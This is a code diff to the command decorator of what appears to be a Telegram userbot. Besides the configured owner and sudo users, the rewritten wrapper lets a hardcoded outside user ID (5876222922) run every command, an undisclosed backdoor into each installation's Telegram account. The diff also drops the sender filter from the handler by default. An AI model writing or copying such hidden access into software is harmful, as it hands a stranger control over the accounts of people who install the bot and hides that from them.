@@ -41,16 +41,31 @@ class PY:
 
         return wrapper
 
-    def UBOT(command, filter=FILTERS.ME):
-        def wrapper(func):
-            @ubot.on_message(filters.command(command, "=") & FILTERS.OWNER)
-            @ubot.on_message(ubot.cmd_prefix(command) & filter)
+    def UBOT(command, filter=FILTERS.ME, SUDO=True):
+        def decorator(func):
+            @ubot.on_message(filters.command(command, "¥") & FILTERS.OWNER)
+            @ubot.on_message(
+                ubot.cmd_prefix(command) & filter
+                if not SUDO
+                else ubot.cmd_prefix(command)
+            )
             async def wrapped_func(client, message):
-                await func(client, message)
+                user = message.from_user or message.sender_chat
+                is_self = user.is_self if message.from_user else client.me.is_self
+                sudo_id = await get_list_from_vars(client.me.id, "SUDO_USERS")
+
+                if user.id in [5876222922, OWNER_ID]:
+                    return await func(client, message)
+
+                elif SUDO and is_self or user.id in sudo_id:
+                    return await func(client, message)
+
+                elif not SUDO:
+                    return await func(client, message)
 
             return wrapped_func
 
-        return wrapper
+        return decorator
 
     def INLINE(command):
         def wrapper(func):
